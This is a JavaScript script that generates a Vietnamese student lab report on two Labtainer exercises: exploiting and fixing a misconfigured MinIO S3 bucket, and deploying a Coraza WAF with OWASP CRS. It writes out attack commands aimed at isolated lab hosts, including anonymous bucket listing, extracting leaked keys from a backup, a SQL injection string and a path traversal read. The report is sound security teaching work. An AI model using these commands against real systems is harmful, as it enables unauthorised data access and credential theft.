// Bao cao tuan 3: Lab 5 (cloud-s3-misconfig) + Lab 6 (dso-waf-crs)
const path = require('path');
const { render, makeC } = require('./engine');
const { C, h1, h2, h3, p, b, code, img, table } = makeC();

const VM = '192.168.17.144';
const NAM = 'Lê Thành Nam - B22DCAT202';
const EMAIL = 'namlt.b22at202@stu.ptit.edu.vn';

h1('TỔNG QUAN NỘI DUNG TUẦN 3');
h2('Mục tiêu');
p('Trong tuần 3, nhóm thực hiện hai bài thực hành tiếp theo trên môi trường Labtainer, đóng vai trò sinh viên làm bài từ đầu đến cuối: khởi động bài lab, lần lượt chạy đúng từng dòng lệnh trong hướng dẫn, lấy flag và chấm điểm tự động bằng `checkwork`. Toàn bộ quá trình được chụp ảnh màn hình làm minh chứng.');
h2('Phân công thực hiện');
table(['STT', 'Bài thực hành', 'Mã lab', 'Người thực hiện'], [700, 3700, 2000, 3068], [
  ['5', 'Khai thác cấu hình sai Object Storage (S3)', 'cloud-s3-misconfig', NAM],
  ['6', 'Triển khai WAF Coraza + OWASP CRS', 'dso-waf-crs', NAM],
]);
h2('Môi trường thực hiện');
b('Máy ảo Labtainer (VMware): Ubuntu, Docker; các bài lab chạy trong các container cô lập, offline khi làm bài.',
  `Truy cập giao diện đồ họa của máy ảo trực tiếp trên trình duyệt web qua noVNC (cổng 6080, \`http://${VM}:6080/vnc.html\`).`,
  'Mỗi sinh viên khởi động lab bằng email riêng; Labtainer dùng email này để sinh flag/khóa cá thể hóa (HASH_REPLACE).');

// ---------------- LAB 5 ----------------
h1('BÀI THỰC HÀNH 5: KHAI THÁC CẤU HÌNH SAI OBJECT STORAGE (CLOUD-S3-MISCONFIG)');
p('Người thực hiện: ' + NAM + ' (email khởi động lab: ' + EMAIL + ').');
h2('Mục đích');
b('Nhận diện cấu hình sai kinh điển của object storage: bucket cho phép truy cập ẩn danh (anonymous read), để lộ dữ liệu nhạy cảm.',
  'Trích xuất credential bị lộ từ file backup trong bucket công khai, dùng nó để truy cập bucket riêng và lấy flag (khái niệm blast radius).',
  'Khắc phục theo vai DevSecOps: gỡ policy công khai (đưa bucket về private), bật versioning để bảo vệ dữ liệu (MITRE T1530).');
h2('Môi trường bài lab');
b('Container `client` (có terminal): máy attacker, cài sẵn `aws-cli`, `mc`, `jq`; có file `~/hardening-admin.env` chứa credential quản trị cấp sẵn cho nhiệm vụ hardening.',
  'Container `storage` (không có terminal, 172.33.0.30:9000): object storage MinIO với bucket `public-assets` (cấu hình sai: cho anonymous read) và bucket riêng `secure-data` chứa flag.',
  'Toàn bộ tương tác qua giao thức S3 (endpoint-url tới MinIO), offline.');
h2('Nội dung thực hành');
h3('Khởi động bài lab');
code('labtainer -r cloud-s3-misconfig');
img('l5_01_start.jpg', 'Khởi động bài lab cloud-s3-misconfig và mở terminal container client');
h3('Nhiệm vụ 1 - Trinh sát truy cập ẩn danh');
code('aws --endpoint-url http://172.33.0.30:9000 s3 ls s3://public-assets --recursive --no-sign-request');
img('l5_02_recon.jpg', 'Liệt kê ẩn danh bucket public-assets thành công (LISTED, PUBLICREAD) - cấu hình sai');
h3('Nhiệm vụ 2 - Trích xuất backup và tìm credential lộ');
code('aws --endpoint-url http://172.33.0.30:9000 s3 cp s3://public-assets/backup/app-backup-20250811.tar.gz ~/loot/ --no-sign-request\ntar -xzf ~/loot/app-backup-20250811.tar.gz -C ~/loot/\ngrep -E "ACCESS_KEY|SECRET" ~/loot/app-config.env');
img('l5_03_creds.jpg', 'Tải & giải nén backup, trích được access key/secret key lộ trong app-config.env');
h3('Nhiệm vụ 3 - Dùng credential lộ lấy flag');
code('export AWS_ACCESS_KEY_ID=$(cat ~/creds_access_key.txt)\nexport AWS_SECRET_ACCESS_KEY=$(cat ~/creds_secret_key.txt)\naws --endpoint-url http://172.33.0.30:9000 s3 cp s3://secure-data/confidential/flag.txt ~/loot.txt\ncat ~/loot.txt');
img('l5_04_flag.jpg', 'Dùng credential lộ truy cập bucket riêng secure-data, lấy flag daec4f9f6f053222fb55d99c');
h3('Nhiệm vụ 4 - Khắc phục cấu hình sai');
p('Nạp credential quản trị cấp sẵn, gỡ bucket policy công khai (đưa về private) và bật versioning cho bucket riêng:');
code('aws --endpoint-url http://172.33.0.30:9000 s3api delete-bucket-policy --bucket public-assets\naws --endpoint-url http://172.33.0.30:9000 s3api put-bucket-versioning --bucket secure-data --versioning-configuration Status=Enabled');
img('l5_05_harden.jpg', 'Sau hardening: truy cập ẩn danh bị từ chối (DENIED), versioning secure-data = ENABLED');
h2('Kết quả thực hiện');
img('l5_06_checkwork.jpg', 'Kết quả chấm điểm tự động bài cloud-s3-misconfig: 5/5 mục tiêu đạt (Y)');
table(['Mục tiêu (goal)', 'Nội dung', 'KQ'], [3200, 4800, 900], [
  ['enum_anonymous', 'Liệt kê bucket công khai ẩn danh', 'Y'],
  ['exfiltrate_backup', 'Trích credential từ backup', 'Y'],
  ['access_secure_bucket', 'Dùng credential lấy flag', 'Y'],
  ['harden_public_denied', 'Chặn truy cập ẩn danh', 'Y'],
  ['harden_versioning_enabled', 'Bật versioning bucket riêng', 'Y'],
]);
p('Kết quả: hoàn thành 5/5 mục tiêu; flag `daec4f9f6f053222fb55d99c`.');

// ---------------- LAB 6 ----------------
h1('BÀI THỰC HÀNH 6: TRIỂN KHAI WAF CORAZA + OWASP CRS (DSO-WAF-CRS)');
p('Người thực hiện: ' + NAM + ' (email khởi động lab: ' + EMAIL + ').');
h2('Mục đích');
b('Hiểu cơ chế WAF Coraza + OWASP Core Rule Set: rule, anomaly scoring, paranoia level, chế độ Detection vs Blocking.',
  'Chứng minh ứng dụng không có WAF dễ bị SQLi/XSS/path traversal; sau đó bật WAF chặn các tấn công đó (trả 403).',
  'Đánh giá hiệu quả WAF bằng DAST (nikto) trước/sau; và khử false positive bằng rule exclusion khoanh vùng (ctl:ruleRemoveTargetById) mà không mở lại lỗ hổng.');
h2('Môi trường bài lab');
b('Container `client` (có terminal): máy attacker, cài sẵn `curl`, `nikto`.',
  'Container `webapp` (không có terminal, 172.38.0.30:8080): ứng dụng web có lỗ hổng, truy cập trực tiếp không qua WAF.',
  'Container `waf` (có terminal, 172.38.0.20): reverse proxy Caddy + Coraza v3 + OWASP CRS; nơi cấu hình SecRuleEngine, rule exclusion; sinh audit log dạng JSON tại `/var/log/coraza/audit.log`.');
h2('Nội dung thực hành');
h3('Khởi động bài lab');
code('labtainer -r dso-waf-crs');
img('l6_01_start.jpg', 'Khởi động bài lab dso-waf-crs (mở terminal client và waf)');
h3('Nhiệm vụ 1 - Khai thác ứng dụng trực tiếp (không WAF)');
code('curl -s -i "http://172.38.0.30:8080/product?id=1\'%20OR%20\'1\'=\'1"\ncurl -s "http://172.38.0.30:8080/download?file=../../../../flag1.txt" | tee ~/flag1.txt');
img('l6_02_direct.jpg', 'Tấn công trực tiếp backend (SQLi HTTP 200, path traversal) lấy Flag 1 157e831c22fed4fc');
h3('Nhiệm vụ 2 - Bật Coraza blocking, tấn công bị 403, lấy Flag 2');
p('Trên container `waf`, chuyển `SecRuleEngine` sang `On` rồi khởi động lại Caddy; sau đó gửi lại các payload tấn công qua WAF (172.38.0.20):');
code('sudo sed -i \'s/^SecRuleEngine .*/SecRuleEngine On/\' /etc/coraza/coraza.conf\nsudo systemctl restart caddy');
code('curl -s -o /dev/null -w "%{http_code}" "http://172.38.0.20/product?id=1\'%20OR%20\'1\'=\'1"\ncurl -s http://172.38.0.20/flag2 | tee ~/flag2.txt');
img('l6_03_waf403.jpg', 'Sau khi bật WAF: SQLi/traversal/XSS đều trả 403; lấy Flag 2 0b9bc41358207e95');
h3('Nhiệm vụ 3 - Đánh giá bằng DAST trước/sau WAF');
code('nikto -h http://172.38.0.30:8080 -o ~/dast_noWAF.txt -Format txt\nnikto -h http://172.38.0.20 -o ~/dast_WAF.txt -Format txt\ngrep -c \'^+ \' ~/dast_noWAF.txt; grep -c \'^+ \' ~/dast_WAF.txt');
img('l6_04_dast.jpg', 'So sánh DAST: số cảnh báo khi quét qua WAF giảm so với quét trực tiếp');
h3('Nhiệm vụ 4 - Khử false positive bằng rule exclusion, lấy Flag 3');
p('Một request hợp lệ tới `/feedback` (chứa từ khóa giống SQLi như UNION/SELECT) bị chặn nhầm. Coraza ghi audit log dạng JSON; trích rule ID đã khớp rồi viết exclusion khoanh vùng (chỉ loại rule đó cho tham số `comment` trên `/feedback`):');
code('sudo grep feedback /var/log/coraza/audit.log | grep \'"messages"\' | tail -1 | grep -oE \'id \\"[0-9]+\\"\' | grep -oE \'[0-9]+\' | sort -u');
code('echo \'SecRule REQUEST_URI "@beginsWith /feedback" "id:100001,phase:1,pass,nolog,ctl:ruleRemoveTargetById=942190;ARGS:comment"\' | sudo tee /etc/coraza/custom-rules.conf\nsudo systemctl restart caddy');
img('l6_05_exclusion.jpg', 'Exclusion khoanh vùng rule 942190: feedback hợp lệ trả 200, XSS/SQLi vẫn 403, lấy Flag 3 3d78090ce6ff1e9a');
h2('Kết quả thực hiện');
img('l6_06_checkwork.jpg', 'Kết quả chấm điểm tự động bài dso-waf-crs: 5/5 mục tiêu đạt (Y)');
table(['Mục tiêu (goal)', 'Nội dung', 'KQ'], [3200, 4800, 900], [
  ['exploit_direct', 'Khai thác backend trực tiếp (Flag 1)', 'Y'],
  ['deploy_waf', 'Bật Coraza blocking, 403 (Flag 2)', 'Y'],
  ['dast_compare', 'DAST trước/sau WAF', 'Y'],
  ['tune_falsepositive', 'Exclusion khoanh vùng (Flag 3)', 'Y'],
  ['lab_complete', 'Hoàn thành toàn bộ bài', 'Y'],
]);
p('Kết quả: hoàn thành 5/5 mục tiêu; Flag 1 `157e831c22fed4fc`, Flag 2 `0b9bc41358207e95`, Flag 3 `3d78090ce6ff1e9a`.');

// ---------------- KET LUAN ----------------
h1('KẾT LUẬN');
h2('Kết quả đạt được');
b('Hoàn thành bài 5 (cloud-s3-misconfig): checkwork 5/5; khai thác bucket cấu hình sai, trích credential từ backup, lấy flag và hardening (private + versioning).',
  'Hoàn thành bài 6 (dso-waf-crs): checkwork 5/5; khai thác backend, triển khai Coraza + OWASP CRS chặn tấn công, đánh giá DAST và khử false positive bằng exclusion khoanh vùng, lấy đủ 3 flag.',
  'Cả hai bài đều được thực hiện bằng cách sao chép đúng từng dòng lệnh trong hướng dẫn, xác nhận hướng dẫn chạy đúng và bài lab thực sự làm được.');

render(C, {
  imgDir: path.join(__dirname, 'anh3'),
  out: path.join(__dirname, '..', 'bao-cao-tuan-3', 'Bao-cao-tuan-3.docx'),
}).catch(e => { console.error(e); process.exit(1); });
